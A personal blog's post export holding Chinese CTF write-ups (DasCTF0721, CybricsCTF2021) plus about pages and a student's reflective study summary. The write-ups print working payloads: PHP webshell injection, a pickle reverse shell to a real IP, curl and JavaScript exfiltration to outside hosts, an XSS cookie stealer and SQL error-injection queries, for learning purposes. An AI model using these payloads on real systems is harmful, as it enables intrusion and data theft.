它会返回null，再往上看到_initialize()\n所以最后是会将$upgrade_edition写入中/runtime/client_upgrade_edtion.php中；而整个writelog()函数会被sysup()调用\n跟进这个sysup()和$upgrade_edtion，看是否可用+如何用\n在template/admin_style/default/admin/upgrade/index.htm下看到了确实存在的路由，这个的页面是在后台管理中心 - 系统功能 - 系统在线升级处，随便升一个看看\n抓包之后看到这里确实有post访问和upgrade_edtion参数，那就稳了，直接写🐎\n/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E// 将🐎写进的目标页面/runtime/client_upgrade_edition.php连入蚁剑 拿flag即可\n————比赛的时候我其实是没有搜到齐博建站系统x1.0代码审计这篇的，当时思路是在后台在找有没有可以利用的地方直接写🐎 ，当时找的是独立页管理，尝试upload，但是并不太行（也可能是我太菜了），然后也没去审代码（懒狗）所以 就没出这个题，现在看还是疏忽了 确实完全没注意到系统在线升级这个模块是可用的 也没有认真的分析源码 我的过\n安全,安全,还是xxx的安全  某个特别安全的商店\nHint:\nCREATE TABLE \u0026#34;users\u0026#34; ( \u0026#34;id\u0026#34; INTEGER NOT NULL, \u0026#34;username\u0026#34; TEXT UNIQUE , \u0026#34;login_password\u0026#34; text, \u0026#34;money\u0026#34; INTEGER, \u0026#34;pay_password\u0026#34; TEXT, \u0026#34;flag_num\u0026#34; INTEGER, PRIMARY KEY (\u0026#34;id\u0026#34;) ); CREATE TABLE \u0026#34;flaaaaaaaaag\u0026#34; ( \u0026#34;flllllllag\u0026#34; TEXT );  特别简陋的前端，有登录和注册和主页三个页面，登录处有一定过滤 存在sqli任意注册账号，走一波流程\n😅蚌埠住了\n回过头来看一下Burp对刚才操作的抓包结果，从cookie可以知道后端是flask框架 ，flask的话一般标配sqlite数据库，然后看下页面源码\n注册时用post提交信息，密码部分用的是md5(app.users.password+'CBCTF')，支付密码是encrsa(app.users.pay_password)，好家伙 这个加密 pay_password部分md5+rsa+b64\u0026hellip;\u0026hellip;\n————比赛的时候基本就停到这里了，感觉是sqli 但是不知道怎么注 全是md5的，以下是参考wp之后的复现\n赛后讲题的时候 出题师傅说参考的是这一篇文章数据加密或成WAF失效最大元凶…（原帖被404了 只有个快照 还是百度快照才能看 而且没图）核心是这一段\n这个题的flag购买小站，对pay_password是进行前端md5+rsa+b64加密，后端再对应着拿私钥解密，存入数据库的是md5值，看似很完美 但是其实根本没有waf的介入 没有对参数进行任何过滤，如果我们从中间介入 只保留rsa+b64的部分 就可以任意控制参数达到二次注入的效果\n公钥在网页源码中已经给出，数据表的结果也已经在Hint中了，用cyberchef一把梭\n重新注册个账号，只修改一下username即可 passwd不用变 将pay_password修改为上面生成的值，登陆后即可看到flag\njj\u0026rsquo;s camera  jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点\nHint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应\n 也是已有的东西 但是比赛的时候我没搜到源码（尴尬）源码在这里：在吗宝贝？你点开这个网址看看[打开网站偷拍照片] | 点开一个网址我被记录了ip还偷拍了照片\n（我这个智商真的是负数起步的 上面这两个帖子我看了好久 才反应过来这个钓鱼网站是要干啥。。。。\n前端是一个链接生成站 中间可以加一个id的参数，访问后会自动调用摄像头（但是会有个提示的弹窗），先拍照再相应链接，之后可以到先前的页面查看拍到的照片，数据以post的形式上传至/qbl.php?id=xxx\u0026amp;url=xxx，这是qbl.php的源码\n\u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//存放在当前目录的img文件夹下 if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt;file_put_contents()执行文件写入，内容可控+路径已知，过滤的点在于后缀名是bmp或png 并且只有除去后缀的这文件名可控，php版本是5.2.17，用00截断绕过（post部分要urlencode一下 burp或者hackbar就直接转了\n/qbl.php?id=wuhu.php%00a\u0026amp;url=http://baidu.com POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg== 参考：wp\neasyweb 有一个docker的附件和一些源码\n首页就是个白底黑字的Hello World，审下源码\n直接打断点调试一下（因为这里涉及到session的调用 所以在.vscode中的launch.json处添加一个configuration: \u0026quot;justMyCode\u0026quot;: false这样可以在调用堆栈处看到完整的调用情况\n可以注意到每次刷新之后 session的值都会发生变化，调试的时候可以看到生成这个session时调用了dumps方法，所以这个题就是反序列化的套路啦\npayload有两种吧 反弹shell 或者构造post/get请求到自己可以接收到的平台上，也都是常规做法\nclass A: def __reduce__(self): cmd = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/175.24.73.30/2333 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; s=\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;{}\u0026#39;).read()\u0026#34;.format(cmd) return (eval,(s,)) #reduce必须返回元组或字符串 def hello_world(request): request.session[\u0026#34;233\u0026#34;] = \u0026#34;2333\u0026#34; request.session[\u0026#34;a\u0026#34;] = A() return Response(\u0026#39;Hello World!\u0026#39;) 构造请求的话还是老朋友~~ burp collaborator~~\ncurl \u0026#34;xxxxxx.burpcollaborator.net/`readflag`\u0026#34; 参考：wp\neasyjava java 根本不会\n放个参考链接 溜了：wp1 wp2\n 最近在总结反序列化有关的东西，想把php, python, java的反序列化 做过的东西总结总结，但还是我想得太简单了 一个php的反序列化就有好多好多东西（装死）\n争取早收工吧，还有upload, xss, csrf, sqli\u0026hellip;\u0026hellip;等着总结 还有超级多东西要学要看\n学习好耶！σ`∀´)\n","date":"2021-08-05T23:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/","section":"posts","tags":["wp"],"title":"DasCTF0721 Wp"},{"categories":["CTF"],"contents":"Mic Check (Cyber, Baby, 50 pts)  Author: Vlad Roskov (@mrvos)\nThose organizers are changing game rules all the time! There’s a flag there, and it’s not that easy to capture.\nAlso be sure to join @cybrics Telegram chat for challenge-related announcements and contacting orgs in case all goes wrong\nAdded at 10:10 — looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely\n Scanner (rebyC, Baby, 50 pts)  Author: Mikhail Driagunov (@aethereternity)\nCheck out this cool new game!\nI heard they serve flags at level 5.\n 不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面\n首先用Gif Super把帧间隔调为300ms，然后裁剪出中间有用的部分 放入GIF动态图片分解中看结果 都有在线工具就很方便\n所以这个破玩意到底是啥？猪？还是刺猬？ 别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone\u0026hellip;. 最后一个是二维码 比较麻烦\n再稍微调整一下尺寸，扫描就行了rm -rf’er (CTB, Baby, 166 pts)  Author: Vlad Roskov (@mrvos)\nAlarm! We accidentally did rm -rf /* on a very important server. Now all that’s left is one shell session.\nssh rmrfer@178.154.210.26 Password: sa7Neiyi Rescue the flag.txt file from one of the directories by only using your shell\nAdded at 13:45 — frequent question: yes, if you found flag.txt, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you\n 这个题 emmmmm 只要ssh一连接就会自动执行rm -rf /*的指令，当反应过来的时候系统已经删的连ls指令都不剩了\n先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了rm -rf /*，之后就可以顺畅的穿梭于这个buildbox之间拿flag了\n预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成\u0026quot;read\u0026quot;的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中echo $\u0026lt;命令相当于read函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload (echo \u0026quot;$\u0026lt;\u0026quot;) \u0026lt; /etc/ctf/flag.txt，即 读取flag.txt并输出\nAd Network (Web, Baby, 50 pts)  Author: Alexander Menshchikov (@n0str)\nWe are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.\nAdnetwork website\nThere is a flag 1337 redirects deep into the network\u0026hellip;\n 这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？\nemmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图 这个图在昨天做的时候看到， 内容是 awesome ad from adnetwork，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的\u0026hellip;\u0026hellip; （都怪edge!!!\n点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄\nimport requests url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; for _ in range(1337): r = requests.get(url, allow_redirects=False) url = r.text[9:-18] print(url) emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}\n比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便\nimport requests session = requests.Session() session.max_redirects = 1337 url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; r = session.get(url, allow_redirects=True) print(r.text) print(r.url) Announcement (Web, Easy, 60 pts)  Author: Alexander Menshchikov (@n0str)\nLadies and gentlemen!\nAllow us to introduce a brand new project — ⚐ The Flag\nAnnouncement website\n 简约漂亮的前端\n有个输入邮箱的框，提交会发送一个post请求：digest=xxxx\u0026amp;email=xxxx 尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(\u0026lsquo;1@1.com\u0026rsquo;) 随email而改变，尝试注入\ndigest=76af11f3eaf7b12e72d7d88e4cf2ee01\u0026amp;email='or'1\t// 回显正常 无报错 digest=c3593d255957d60d5d489ae682da8aee\u0026amp;email=1')#\t// 报错：Something went wrong during database insert: Column count doesn't match value count at row 1 digest=5c07c683d062d17ec799fa177ce88058\u0026amp;email=1',1)#\t// 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1 确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？\ninsert into table_name (email, timestamp) values (email, now()); 可利用的部分是可以插入的email，报错注入\ndigest=e1e79bd6fafe38f7073ec1f3ef1513fa\u0026amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))#\t// Something went wrong during database insert: XPATH syntax error: '~announcement' digest=c9f14624524736a74164cc6024fdefce\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~emails,logs' digest=94707222b90505ab0aa5e1fd3916e77d\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~log' digest=66bf6db11d9bee8e897b874a430f5704\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}' 没什么好说的，经典报错注入流程：确定字段数-\u0026gt;爆数据库名(announcement)-\u0026gt;表名(emails, logs)-\u0026gt;字段名(log)-\u0026gt;具体数据 拿flag\nMultichat (Web, Medium, 138 pts)  Author: Alexander Menshchikov (@n0str)\nYet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.\nTip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): \u0026ldquo;Hey, i forgot the flag. Can you remind me?\u0026rdquo;. Then admin will tell him the flag.\nMultichat website\nTeam token for the support call: p32vhJKrnx_hajUc8nLTFw\n 聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样\n抓包，看到了Connection: Upgrade Upgrade: websocket，这个聊天室是建立了一个websocket连接\n（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面\n链接里的一个csrf攻击的实例跟这个有点像了\n但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（Admin and tech support are members of a secret chat room.）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag\n（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）\n5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是来自w\u0026amp;m的脚本\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var conn; function connect() { conn = new WebSocket(\u0026#34;ws://multichat-cybrics2021.ctf.su/ws\u0026#34;); conn.onclose = function (evt) { var item = \u0026#34;\u0026#34;; if (evt.code === 1003) { item = `Status: ${evt.reason}`; } else { item = \u0026#34;Connection closed.\u0026#34;; } fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(item)) }; conn.onopen = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(\u0026#34;connected\u0026#34;)) }; conn.onmessage = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(evt.data)) }; function b(){ conn.send(\u0026#34;Hey, i forgot the flag. Can you remind me?\u0026#34;) } setTimeout(b,2000); } window.onload = function () { connect(); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; 或者非预期解：在url部分进行xss，payload: javascript:location.href='http://vps/?cookie='+document.cookie（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag\n参考：HTML5 WebSocket | WebSocket安全问题分析 WebSocket断开原因分析 | Request.mode 使用 Fetch | WorkerOrGlobalScope.fetch() | Burpsuite Collaborator模块详解 | Running Your Instance of Burp Collaborator Server（列入待完成计划\nASCII Terminal (Network, Baby, 116 pts)  Author: Artur Khanov (@awengar)\nAt 138.68.83.253:3333 you have an ASCII terminal. It really works, check with the id command\n nc连上以后可以看到一个bash $，题目的提示是\u0026quot;ASCII termial\u0026quot;\n把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具\ntoilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如\n可以玩出很多花样~\n书归正题，这里使用toilet -f bigascii9 +command的命令生成结果，将空格换为 .再发送即可\ntoilet -f bigascii9 ls \u0026gt; ls.txt cat ls.txt | nc 138.68.83.253 3333 \u0026gt; ls_result.txt toilet -f bigascii9 'cat flag.txt' \u0026gt; cat.txt cat cat.txt | nc 138.68.83.253 2333 \u0026gt; flag.txt （值得注意的是 如果直接使用上面的命令生成相应文件后用vim编辑器的%s/\\s/./g命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下\n最后flag：cybrics{T3553R4C7_15_GOOD}\n————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到录播视频中看\n参考：调皮捣蛋的Linux下有趣终端的合集 | Linux Fun - 如何在终端中创建ASCII文本横幅 | Neofetch - 显示具有分发标志的Linux系统信息\nLX-100 (Network, Easy, 192 pts)  Author: Vlad Roskov (@mrvos)\nWe were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.\nAnyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.\nlx100.pcap\n （说实话，pacp包是真的不会看TAT\n首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件 （以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是官方视频中确实这样可以成功 emmmm\ntshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data \u0026gt; hex.txt php -a foreach(file(\u0026quot;hex.txt\u0026quot;)as $i =\u0026gt; $ln) {file_put_contents(\u0026quot;frame$i.jpg\u0026quot;,hex2bin(trim($ln)));} （以下是在别的wp中看到的py脚本： 可成功复现 导出455张jpg图\nimport pyshark cap = pyshark.FileCapture(\u0026#39;lx100.pcap\u0026#39;) count = 0 for packet in cap: if \u0026#34;UDP\u0026#34; in packet and int(packet[\u0026#39;udp\u0026#39;].srcport) == 65415: count = count + 1 udp_bytes = bytearray.fromhex(packet.data.data[packet.data.data.find(\u0026#39;ffd8ffdb\u0026#39;):]) file_out = open(\u0026#39;out_files/\u0026#39; + str(count) + \u0026#39;_packet.jpg\u0026#39;, \u0026#39;wb\u0026#39;) file_out.write(udp_bytes) 放大 再放大 每一根 最后的flag是 cybrics{Lost_Secrets_In_The_AIr}\nlocalhost (Network, Hard, 267 pts)  Author: Vlad Roskov (@mrvos)\nRemember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.\nssh localhost@109.233.61.10 Password: ohx7eeQu Your team token \u0026gt; Sw0T5cecsfJfaKApOiKzsA\n 先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水\n自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段nmap -sS -Pn 10.193.10.7/24\n发现10.193.10.180的80端口开放，用curl访问\n提示Flag-containing-Records 接着访问两个超链接的内容\ncurl 10.193.10.180/redis.conf是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：\nbind 127.0.0.1 protected-mod yes port 6379 curl 10.193.10.180/sysctl.conf也是相关的配置文件 只有一句没被注释\nnet.ipv4.conf.all.route_localnet=1 查google，发现了这些：net.ipv4.conf.all.route_localnet=1 opens security issue #90259 | POC-2020-8558\n是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：\n In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the net.ipv4.conf.all.route_localnet=1 sysctl setting. According to the kernel documentation, this setting makes the kernel \u0026ldquo;not consider loopback addresses as martian\u0026rdquo; \u0026ndash; a consequence of which is that they could be accessed by other nodes on the network. That\u0026rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!\n\u0026hellip;\u0026hellip;\nA normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting net.ipv4.conf.all.route_localnet=1 changes that \u0026ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.\nSo, if an attacker has a local connection to a target node with net.ipv4.conf.all.route_localnet=1, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.\nNote that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker\u0026rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.\n （不得不说ipv4当初把整个127.0.0.0/8的地址都给了本地回环用真的是太慷慨了\u0026hellip;\u0026hellip; 到ipv6就只有一个:: 1\n在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明\n tst-2020-8558.py Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to 127.0.0.1 via your target, and looks to see if there is a reply.\npoc-2020-8558.py Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default). Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal. Because this script uses raw sockets to send and receive the \u0026ldquo;localhost\u0026rdquo; packets, it works fine inside a normal unprivileged container.\n 因为需要nc 所以另开一个shell\n参考：wp | 为什么整个127.*网段都被拿来当做环回地址了？\n 本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，此处是参考wp\n道阻且长呀，暑假要好好努力咯 (つд⊂) 参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆\n","date":"2021-07-29T17:02:12+08:00","permalink":"https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/","section":"posts","tags":["wp"],"title":"CybricsCTF2021 Wp"},{"categories":[],"contents":"好像还是空空如也qwq\n","date":"2021-07-27T14:37:22+08:00","permalink":"https://amiaaaz.github.io/friends/","section":"","tags":[],"title":"Friends"},{"categories":[],"contents":"你好呀！这里是葵子 这里应该有一个简略的个人介绍\n（详细的内容还得等我慢慢措辞 剩下部分留空了\n","date":"2021-07-27T14:28:14+08:00","permalink":"https://amiaaaz.github.io/about/","section":"","tags":[],"title":"About"},{"categories":[],"contents":"时间飞逝，一眨眼进入大学已经快一年了，但时常觉得报道入校就在昨天。\n去年12月开始接触到ctf，0基础，每周末做一做ctfhub的技能树，当时对整个计算机世界算是完全小白 遇到一个名词就要查一查什么意思，经常是看个半天还是一知半解，做题也只能机械的重复一下搜到的wp里的步骤，有样学样。也就坚持了1个月，就开始复习期末考试→考试→放假，寒假算是在家里躺过去的，每天宅着看看剧 刷刷手机，碌碌无为的什么都不想干；临近开学了，才如梦初醒般的悔悟，看了两本书，捣鼓了下手机，浅浅地了解了一下安卓的刷机和搞机的相关知识。\n三月底正式开学，四月初开始把“荒废”的ctf题继续捡起来，从之前的每周末做做题变成了每天晚上都拿出时间来学习。当时虽然对安全还是懵懂的认识，但是我的直觉告诉我这就是我的爱好，是能带来成就感和快乐的东西，我愿意花时间去琢磨它。也是四月，看了《网络是怎样连接的》《图解http》和《图解tcp/ip》，正式的了解了一下计网（虽然也只是个入门）；做完ctfhub的web部分之后，也算是对ctf里web部分的基本类型都见过了，开始在buuoj上真正做一些ctf的题。\n然而到真正到做ctf题的时候发现自己又是那样的渺小，拿到一道题也只能抓包、扫目录，好一点的能拿到泄露的源码，可是到代码审计又是完全的稀烂，js不会看 php不会看 java更不会看，甚至连复杂一点的python也不会看，一个类型的题 稍微变个花样 拐个弯就又看不懂了，一副痛苦面具；现在回过头来看 很庆幸当时即使遇到了种种问题也没打退堂鼓，没见过的函数就去搜文档 看用法，没见过的知识点就去搜相关资料，看不懂的题就多看几个不同的wp 然后复现 用自己的话再整理出来 打好tag放到notion上。\n很快到了五月，五月初把老旧厚重的电脑换掉了，新上手的装备提升了不少学习的舒适感；这段时间也夹杂着做了一点burpsuite portswigger的题（这块做的不太扎实，而且当时做的时候没有用图床 笔记里的图片也都丢掉了 之后得回过头来重新看看），也夹杂做了几个单独类型的靶场；然后是两周难熬的军训。虽然军训难熬，但是过的真的很快乐。这里就是懂的都懂了，不详说。开心快乐的几个月，我将永远铭记。\n军训回来以后就六月了，算是进入正轨？不知道这样说是不是很合适，对很多题目也是一回生 二回熟，从一开始的完全不知道从哪里下手到稍微能分析一点（虽然还是不能脱离wp独自行走），可能对于一些有天赋的大佬来说这些轻轻松松，我可能花几个小时能搞懂的东西只需要别人一个小时能理解透，但是我已经很满意了，那句话怎么说？“进一寸有一寸的欢喜”，或许就是这样吧，虽然每天是笨拙地学着，但也开心。\n也是六月之后，开始关注漏洞、渗透、攻防等等安全方面核心向的一些东西，开始每天抽出时间看安全类的公众号文章，一开始只是不明觉厉——哇 虽然看不懂是在干什么 但是好nb 好厉害，看的多了一点以后开始慢慢明白那些高大上的名词是什么意思，原来网络安全的世界是那么让人着迷。也开始正式接触ctf比赛（虽然也就是进去签个到的水平……），开始做vulnhub的靶机，开始复盘之前做过的题，慢慢的 旁征博引 一点点的丰富知识体系。\n现在已经是7月中旬了，很快就要从大一的菜鸡变为大二的菜鸡了，回顾这一年的学习和生活也是感慨良多。满打满算，接触安全是不到四个月吧，算是也不短了，可是认真捋一下整个的过程 又是漏洞百出——代码审计能力稀烂，经常分析不出来问题所在的地方；逻辑链条一长的题目就思维呆滞 总是会下意识地想放弃 这真的不是个好现象；sqli和upload类的题做了不少，但还是不能自己独立的 完全不参考别人的wp完成一整个分析过程；对于python的掌握不够好，明显反应在任何需要编写py脚本的题目上；对一些知识点——不说一些了，可以说是全部的东西的了解和认识都还是浅尝辄止，停留在纸面上的花架子，比如反序列化 比如目录遍历，脑子里只能说有个残存的印象 可真正给我个这样的题 还是不能说轻松上手，甚至是对一些概念还理不清楚，学的东西可能看起来是有个样子 但我心里清楚 差的还太远太远，甚至完全没有到能自信的跟别人说“我在学ctf 我在学安全”的程度。\n学不动的时候经常会看大佬的博客，看看别人的学习经历是什么样的。之前还会拿年龄做自我开脱的借口，还小，还早，还都来得及，可是越学 越发现要去点亮的技能树越是枝繁叶茂，厚厚的树冠仿佛要遮天蔽日般——要学java 提高代码审计能力 常见的漏洞类型要做到心里有数，要把之前做过的题多温习 多想多练多看，要做到真正的掌握知识 而不是记住这个东西叫什么 徒有其表，要多写写代码 写代码的基本功太差那肯定是走不远，最感兴趣的渗透和漏洞方面的东西更要多看 可以本地复现的不要懒；即便如此，也有不少阳光能够穿透树叶交叠之处，温暖的洒落。可能我真的不是所谓的天赋型选手，只不过是万千平平无奇的普通人之一，学习能力也就是个中等水平，但是我相信量变引起质变，相信持之以恒的努力会带来改变，更何况这还是我非常喜欢的事情；可能我即使努力四年 也达不到那些大佬半年就能达到的高度，但是不重要 学习嘛 就是不会才要学，就算学不会也不是什么丢人的事情，日拱一卒，功不唐捐。\n再一抬眼，暑假就要来了。要干的和要学的很多，千头万绪的；但也算是有明确的方向，人还是忙起来好。下学期就大二了，再一晃就大三了，自己是不想考研的，但是到了大四 自己的实力够进大厂吗？会不会毕业即失业？我不知道，但谁又知道呢？未来的事情预测不了，能做的只有把握当下。\n大一就要结束了，在图书馆常坐的座位上，打开typora，草草的复盘了一下整个一学年。上一次写复盘总结还是六月初 刚军训完，一个有点迷茫的时候。如果跟0基础的自己比起来，可以说是成长了不少；但我知道这还远远达不到平均线，差的还太多，是完全拿不出手的程度。但总的来说，还算有一点点小小的收获，希望自己在之后的日子里也能坚守住初心，保持对安全的热爱，保持学习的热情，也保持对美好生活的热忱；希望能够变得越来越强大；希望大二的寒假写复盘总结的时候能有更多可写的 更多开心的事情。\n：）\n 之后的总结呀，一些随笔也都会放到小站上，不过一部分就不放到公开展示的posts上了，url就是/:year/:month/:day/:slug/的形式，算是变相的加密博客了叭？不过应该是家贼难防捏（\n","date":"2021-07-22T18:27:39+08:00","permalink":"https://amiaaaz.github.io/2021/07/22/0920-0721-summary/","section":"secrets","tags":[],"title":"一点小小的总结（"}]